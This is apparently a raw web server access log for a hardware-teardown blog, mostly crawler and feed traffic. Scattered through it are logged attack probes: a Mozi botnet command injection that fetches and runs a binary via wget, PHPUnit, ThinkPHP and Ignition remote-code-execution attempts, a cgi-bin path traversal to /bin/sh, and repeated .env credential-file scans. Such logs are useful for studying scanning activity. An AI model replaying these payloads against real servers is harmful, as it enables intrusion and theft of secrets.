149.202.86.61 - - [07/Jan/2022:04:04:37 +0000] "GET /blog/2010/12/5/?C=S;O=D HTTP/1.1" 301 250 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
149.202.86.61 - - [07/Jan/2022:04:04:54 +0000] "GET /blog/2010/12/5/Sometimes_64_bits_just_arent_enough.html HTTP/1.1" 301 282 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
149.202.86.61 - - [07/Jan/2022:04:05:11 +0000] "GET /blog/2010/12/6/ HTTP/1.1" 301 242 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
149.202.86.61 - - [07/Jan/2022:04:05:27 +0000] "GET /blog/2010/12/6/?C=D;O=A HTTP/1.1" 301 250 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
149.202.86.61 - - [07/Jan/2022:04:05:49 +0000] "GET /blog/2010/12/6/?C=D;O=D HTTP/1.1" 301 250 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
149.202.86.61 - - [07/Jan/2022:04:06:05 +0000] "GET /blog/2010/12/6/?C=M;O=A HTTP/1.1" 301 250 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
149.202.86.61 - - [07/Jan/2022:04:06:36 +0000] "GET /blog/2010/12/6/?C=N;O=D HTTP/1.1" 301 250 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
149.202.86.61 - - [07/Jan/2022:04:07:05 +0000] "GET /blog/2010/12/6/SCS-26UC4%20Teardown%20Photos%20up.html HTTP/1.1" 301 275 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
149.202.86.61 - - [07/Jan/2022:04:07:21 +0000] "GET /blog/2010/12/6/SCS-26UC4_Teardown_Photos_up.html HTTP/1.1" 301 275 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
149.202.86.61 - - [07/Jan/2022:04:07:35 +0000] "GET /blog/2010/12/8/ HTTP/1.1" 301 242 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
149.202.86.61 - - [07/Jan/2022:04:08:01 +0000] "GET /blog/2010/12/8/?C=D;O=D HTTP/1.1" 301 250 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
149.202.86.61 - - [07/Jan/2022:04:08:19 +0000] "GET /blog/2010/12/8/?C=M;O=A HTTP/1.1" 301 250 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
149.202.86.61 - - [07/Jan/2022:04:08:37 +0000] "GET /blog/2010/12/8/?C=M;O=D HTTP/1.1" 301 250 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
149.202.86.61 - - [07/Jan/2022:04:08:56 +0000] "GET /blog/2010/12/8/?C=N;O=A HTTP/1.1" 301 250 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
149.202.86.61 - - [07/Jan/2022:04:09:21 +0000] "GET /blog/2010/12/8/?C=S;O=A HTTP/1.1" 301 250 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
149.202.86.61 - - [07/Jan/2022:04:09:38 +0000] "GET /blog/2010/12/8/?C=S;O=D HTTP/1.1" 301 250 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
149.202.86.61 - - [07/Jan/2022:04:09:56 +0000] "GET /blog/2010/12/8/Mounting_ISOs_in_HP-UX.html HTTP/1.1" 301 269 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
149.202.86.61 - - [07/Jan/2022:04:10:10 +0000] "GET /blog/2010/12/?C=D;O=A HTTP/1.1" 301 248 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
149.202.86.61 - - [07/Jan/2022:04:10:30 +0000] "GET /blog/2010/12/?C=D;O=D HTTP/1.1" 301 248 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
149.202.86.61 - - [07/Jan/2022:04:10:49 +0000] "GET /blog/2010/12/?C=M;O=A HTTP/1.1" 301 248 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
149.202.86.61 - - [07/Jan/2022:04:11:08 +0000] "GET /blog/2010/12/?C=M;O=D HTTP/1.1" 301 248 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
149.202.86.61 - - [07/Jan/2022:04:11:29 +0000] "GET /blog/2010/12/?C=N;O=A HTTP/1.1" 301 248 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
149.202.86.61 - - [07/Jan/2022:04:11:49 +0000] "GET /blog/2010/12/?C=S;O=D HTTP/1.1" 301 248 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
149.202.86.61 - - [07/Jan/2022:04:12:09 +0000] "GET /blog/2010/12/astaro-ap30-teardown.html HTTP/1.1" 301 265 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
149.202.86.61 - - [07/Jan/2022:04:12:18 +0000] "GET /blog/2010/12/attaching-a-console-cable-to-the-samsungverizon-scs-26uc4.html HTTP/1.1" 301 302 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
5.188.210.227 - - [07/Jan/2022:04:29:04 +0000] "GET http://5.188.210.227/echo.php HTTP/1.1" 301 238 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
97.107.141.188 - - [07/Jan/2022:04:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
162.241.225.75 - - [07/Jan/2022:04:44:04 +0000] "GET / HTTP/1.1" 301 227 "-" "-"
216.244.66.231 - - [07/Jan/2022:05:03:04 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
114.119.133.35 - - [07/Jan/2022:05:08:20 +0000] "GET /blog/tags/Windshield.html HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
66.249.66.208 - - [07/Jan/2022:05:11:10 +0000] "GET /blog/2012/12/4/The%20Costs%20of%20Thread%20Synchronization.html HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
125.46.139.48 - - [07/Jan/2022:05:13:45 +0000] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 226 "-" "-"
45.137.23.232 - - [07/Jan/2022:05:16:07 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 zgrab/0.x"
62.210.88.24 - - [07/Jan/2022:05:27:17 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0"
66.249.66.210 - - [07/Jan/2022:05:30:59 +0000] "GET /blog/2012/12/4/The%20Costs%20of%20Thread%20Synchronization.html HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
23.239.11.46 - - [07/Jan/2022:05:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
216.244.66.231 - - [07/Jan/2022:05:49:37 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
139.162.145.250 - - [07/Jan/2022:05:55:28 +0000] "\x16\x03\x01" 400 226 "-" "-"
85.202.169.115 - - [07/Jan/2022:06:18:57 +0000] "GET / HTTP/1.1" 301 230 "-" "Linux Gnu (cow)"
172.104.217.53 - - [07/Jan/2022:06:41:16 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
136.144.41.117 - - [07/Jan/2022:06:47:12 +0000] "GET / HTTP/1.1" 301 230 "-" "Linux Gnu (cow)"
45.146.165.37 - - [07/Jan/2022:06:50:20 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 280 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
5.9.61.101 - - [07/Jan/2022:06:53:27 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
5.9.61.101 - - [07/Jan/2022:06:53:29 +0000] "GET /blog/2010/12/3/Attaching%20a%20Console%20Cable%20to%20the%20Samsung/Verizon%20SCS-26UC4.html HTTP/1.1" 301 305 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
193.27.14.216 - - [07/Jan/2022:07:12:30 +0000] "HEAD / HTTP/1.1" 301 - "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
193.27.14.216 - - [07/Jan/2022:07:12:30 +0000] "GET /.env HTTP/1.1" 301 234 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
193.27.14.216 - - [07/Jan/2022:07:12:30 +0000] "POST / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
45.146.165.37 - - [07/Jan/2022:07:26:57 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 280 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
60.191.125.35 - - [07/Jan/2022:07:32:53 +0000] "HEAD http://112.124.42.80:63435/ HTTP/1.1" 301 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
113.120.11.31 - - [07/Jan/2022:07:32:55 +0000] "HEAD http://110.242.68.4/ HTTP/1.1" 301 - "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
60.191.125.35 - - [07/Jan/2022:07:32:55 +0000] "CONNECT 112.124.42.80:443 HTTP/1.1" 301 230 "-" "Java/1.8.0_252"
113.120.11.31 - - [07/Jan/2022:07:32:56 +0000] "CONNECT 110.242.68.4:443 HTTP/1.1" 301 229 "-" "PycURL/7.43.0 libcurl/7.47.0 GnuTLS/3.4.10 zlib/1.2.8 libidn/1.32 librtmp/2.3"
128.14.134.170 - - [07/Jan/2022:07:33:12 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
50.116.54.8 - - [07/Jan/2022:07:41:16 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
45.146.165.37 - - [07/Jan/2022:07:47:40 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.88.169.106 - - [07/Jan/2022:07:47:44 +0000] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
43.131.23.42 - - [07/Jan/2022:08:09:56 +0000] "GET / HTTP/1.1" 301 230 "-" "-"
45.146.165.37 - - [07/Jan/2022:08:36:30 +0000] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 301 354 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
175.107.2.141 - - [07/Jan/2022:08:39:49 +0000] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 301 277 "-" "-"
50.116.54.8 - - [07/Jan/2022:08:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
45.146.165.37 - - [07/Jan/2022:08:52:48 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 301 298 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
108.59.8.70 - - [07/Jan/2022:09:06:35 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
157.90.209.81 - - [07/Jan/2022:09:06:37 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
108.59.8.70 - - [07/Jan/2022:09:06:38 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
118.184.177.66 - - [07/Jan/2022:09:13:05 +0000] "GET / HTTP/1.1" 301 227 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
50.116.23.167 - - [07/Jan/2022:09:21:47 +0000] "GET / HTTP/1.1" 301 227 "-" "python-requests/2.26.0"
50.116.23.167 - - [07/Jan/2022:09:21:48 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/96.0.4664.45 Safari/537.36"
45.146.165.37 - - [07/Jan/2022:09:37:02 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.104.217.53 - - [07/Jan/2022:09:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
45.146.165.37 - - [07/Jan/2022:09:50:39 +0000] "GET /console/ HTTP/1.1" 301 238 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
157.55.39.149 - - [07/Jan/2022:09:55:10 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.25 - - [07/Jan/2022:09:55:18 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
216.244.66.232 - - [07/Jan/2022:10:02:23 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
176.109.186.65 - - [07/Jan/2022:10:04:26 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
192.241.218.25 - - [07/Jan/2022:10:10:59 +0000] "GET /ReportServer HTTP/1.1" 301 242 "-" "Mozilla/5.0 zgrab/0.x"
209.141.53.74 - - [07/Jan/2022:10:11:42 +0000] "GET /config/getuser?index=0 HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
157.55.39.91 - - [07/Jan/2022:10:17:49 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
205.185.114.93 - - [07/Jan/2022:10:20:21 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 400 226 "-" "-"
45.146.165.37 - - [07/Jan/2022:10:24:19 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
52.25.152.214 - - [07/Jan/2022:10:24:31 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
54.212.107.166 - - [07/Jan/2022:10:27:56 +0000] "GET /favicon.ico HTTP/1.1" 301 239 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
54.212.107.166 - - [07/Jan/2022:10:28:02 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
45.79.148.82 - - [07/Jan/2022:10:41:16 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
216.244.66.232 - - [07/Jan/2022:10:48:11 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
66.249.66.16 - - [07/Jan/2022:11:06:36 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.66.16 - - [07/Jan/2022:11:06:36 +0000] "GET /blog/2014/2/1/Inside%20the%20EDUP%20EP-AB003%202.4GHz%20Amplifier.html HTTP/1.1" 301 287 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
45.146.165.37 - - [07/Jan/2022:11:14:02 +0000] "GET /_ignition/execute-solution HTTP/1.1" 301 256 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
207.46.13.170 - - [07/Jan/2022:11:30:23 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
45.79.148.82 - - [07/Jan/2022:11:41:18 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
198.98.49.124 - - [07/Jan/2022:11:42:18 +0000] "GET / HTTP/1.1" 301 230 "-" "Linux Gnu (cow)"
123.125.109.105 - - [07/Jan/2022:11:46:29 +0000] "GET / HTTP/1.1" 301 227 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
38.18.44.34 - - [07/Jan/2022:11:46:41 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
35.153.99.205 - - [07/Jan/2022:11:59:23 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1; rv:85.0) Gecko/20100101 Firefox/85.0"
35.153.99.205 - - [07/Jan/2022:11:59:30 +0000] "HEAD /favicon.ico HTTP/1.1" 301 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2; rv:76.0) Gecko/20100101 Firefox/76.0"
8.29.198.25 - - [07/Jan/2022:11:59:43 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feedly/1.0 (+http://www.feedly.com/fetcher.html; 8 subscribers; like FeedFetcher-Google)"
45.146.165.37 - - [07/Jan/2022:12:06:13 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 226 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.118.160.53 - - [07/Jan/2022:12:19:41 +0000] "GET / HTTP/1.0" 301 227 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
185.83.144.103 - - [07/Jan/2022:12:39:34 +0000] "GET /dist/app.js HTTP/1.1" 301 239 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.144.103 - - [07/Jan/2022:12:39:34 +0000] "POST /dist/app.js HTTP/1.1" 301 239 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
69.164.211.90 - - [07/Jan/2022:12:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
184.105.139.70 - - [07/Jan/2022:12:45:34 +0000] "GET / HTTP/1.1" 301 230 "-" "-"
94.23.19.22 - - [07/Jan/2022:13:03:20 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
209.141.53.74 - - [07/Jan/2022:13:04:13 +0000] "GET /config/getuser?index=0 HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
205.185.114.93 - - [07/Jan/2022:13:11:44 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 400 226 "-" "-"
66.249.66.208 - - [07/Jan/2022:13:35:41 +0000] "GET /blog/assets_c/2011/01/licensePlateGame-thumb-480x289-43.png HTTP/1.1" 301 286 "-" "Googlebot-Image/1.0"
66.249.66.16 - - [07/Jan/2022:13:35:43 +0000] "GET /blog/assets_c/2011/01/licensePlateGame-thumb-480x289-43.png HTTP/1.1" 301 286 "-" "Googlebot-Image/1.0"
50.116.54.8 - - [07/Jan/2022:13:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
192.9.237.155 - - [07/Jan/2022:14:10:09 +0000] "GET / HTTP/1.1" 301 227 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:10 +0000] "GET /.env HTTP/1.1" 301 231 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:10 +0000] "GET /.remote HTTP/1.1" 301 234 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:11 +0000] "GET /.local HTTP/1.1" 301 233 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:11 +0000] "GET /.production HTTP/1.1" 301 238 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:11 +0000] "GET //vendor/.env HTTP/1.1" 301 238 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:12 +0000] "GET //lib/.env HTTP/1.1" 301 235 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:12 +0000] "GET //lab/.env HTTP/1.1" 301 235 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:12 +0000] "GET //cronlab/.env HTTP/1.1" 301 239 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:12 +0000] "GET //cron/.env HTTP/1.1" 301 236 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:13 +0000] "GET //core/.env HTTP/1.1" 301 236 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:13 +0000] "GET //core/app/.env HTTP/1.1" 301 240 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:13 +0000] "GET //core/Datavase/.env HTTP/1.1" 301 245 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:14 +0000] "GET //database/.env HTTP/1.1" 301 240 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:14 +0000] "GET //config/.env HTTP/1.1" 301 238 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:14 +0000] "GET //assets/.env HTTP/1.1" 301 238 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:15 +0000] "GET //app/.env HTTP/1.1" 301 235 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:15 +0000] "GET //apps/.env HTTP/1.1" 301 236 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:15 +0000] "GET //uploads/.env HTTP/1.1" 301 239 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:16 +0000] "GET //sitemaps/.env HTTP/1.1" 301 240 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
